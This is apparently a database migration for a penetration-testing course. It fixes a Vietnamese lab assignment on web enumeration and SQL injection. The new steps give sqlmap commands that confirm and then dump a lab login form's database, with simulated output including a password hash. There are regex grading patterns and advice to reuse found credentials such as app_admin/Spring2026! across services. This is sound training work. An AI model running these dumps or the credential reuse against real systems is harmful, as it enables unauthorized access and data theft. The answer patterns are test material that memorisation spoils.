-- 0037_assignment2_fixes: fix two logic bugs found by audit in
-- "Assignment 2 -- Web enum den SQLi dump credentials":
--  1. step 3 (choice) asserted trying SSH as if the port was already known
--     open, but no port scan was ever run -- reworded to not assert that.
--  2. the final step jumped straight to --dump-all on a never-before-
--     mentioned endpoint (view.php?id=1) instead of the login.php username
--     field established earlier, and skipped confirming the injection
--     first. Split into a confirm (--dbs) step then a dump step, both
--     targeting login.php consistently with the rest of the assignment.

UPDATE cards SET payload = jsonb_set(payload, '{steps,3}', '{"prompt": "Có creds DB nhưng chưa biết DB server có public port không. Trang login.php vẫn nghi SQLi ở trường username. Bạn ưu tiên hướng nào trước?", "type": "choice", "choices": ["Thử ngay creds app_admin/Spring2026! vào trang /admin, đồng thời quét thêm port để xem còn dịch vụ nào khác (SSH, DB...) đang mở hay không (tái sử dụng mật khẩu)", "Bỏ qua creds vừa tìm, chỉ tập trung khai thác SQLi từ đầu", "Chờ khách hàng xác nhận mới được thử bất kỳ thứ gì"], "answer": 0, "explanation": "Luôn thử tái sử dụng credential tìm được ở MỌI bề mặt tấn công khác (admin panel, SSH nếu port đang mở, API...) trước khi đi tiếp — đây là nguyên tắc ‘credential spraying nội bộ’ rất hiệu quả trong thực chiến và được nhắc đi nhắc lại trên các writeup HTB/THM."}'::jsonb, false)
WHERE kind = 'lab' AND front = 'Assignment 2 — Web enum đến SQLi dump credentials';

UPDATE cards SET payload = jsonb_set(
  payload,
  '{steps}',
  ((payload->'steps') - (jsonb_array_length(payload->'steps') - 1)) || '[{"output": "sqlmap identified the following injection point(s) with a total of 45 HTTP(s) requests:\n---\nParameter: username (POST)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause\n---\navailable databases [2]:\n[*] app\n[*] information_schema", "prompt": "Dùng sqlmap để xác nhận SQLi trên trường username của login.php (gửi qua POST) và liệt kê các database hiện có — KHÔNG dump ngay khi chưa xác nhận.", "hint": "sqlmap -u \"http://10.10.20.25/login.php\" --data \"username=admin&password=admin\" --batch --dbs", "type": "command", "patterns": ["sqlmap\\s+-u\\s+.?http://10\\.10\\.20\\.25/login\\.php.?\\s+--data\\s+.?username=[^\"\\'']*password=[^\"\\'']*.?\\s+--batch\\s+--dbs", "sqlmap\\s+-u\\s+.?http://10\\.10\\.20\\.25/login\\.php.?\\s+--data\\s+.?username=[^\"\\'']*password=[^\"\\'']*.?\\s+--dbs\\s+--batch"], "explanation": "--data gửi request dạng POST với body chỉ định — bắt buộc khi field nghi SQLi nằm trong form POST (login.php) thay vì query string GET. --dbs chỉ liệt kê database, CHƯA dump dữ liệu — luôn xác nhận injection thật trước khi dump để không tốn thời gian vào sai target. Mẹo nhớ: data = dữ liệu POST gửi kèm, dbs = DataBaseS."}, {"output": "Database: app\n[3 tables]\n+----------+\n| users    |\n| products |\n| sessions |\n+----------+\n...\n[users]\nadmin:5f4dcc3b5aa765d61d8327deb882cf99\n...", "prompt": "Đã xác nhận có database ''app''. Dump toàn bộ dữ liệu database này.", "hint": "sqlmap -u \"http://10.10.20.25/login.php\" --data \"username=admin&password=admin\" -D app --batch --dump-all", "type": "command", "patterns": ["sqlmap\\s+-u\\s+.?http://10\\.10\\.20\\.25/login\\.php.?\\s+--data\\s+.?username=[^\"\\'']*password=[^\"\\'']*.?\\s+-D\\s+app\\s+--batch\\s+--dump-all", "sqlmap\\s+-u\\s+.?http://10\\.10\\.20\\.25/login\\.php.?\\s+--data\\s+.?username=[^\"\\'']*password=[^\"\\'']*.?\\s+--dump-all\\s+-D\\s+app"], "explanation": "-D app chỉ định đúng database vừa xác nhận ở bước trước, --dump-all dump toàn bộ table trong database đó — luôn dump SAU khi đã xác nhận injection thật, không nhảy thẳng vào dump-all mù ngay từ đầu. Mẹo nhớ: D = Database, dump-all = xuất hết mọi bảng."}]'::jsonb,
  true
)
WHERE kind = 'lab' AND front = 'Assignment 2 — Web enum đến SQLi dump credentials';
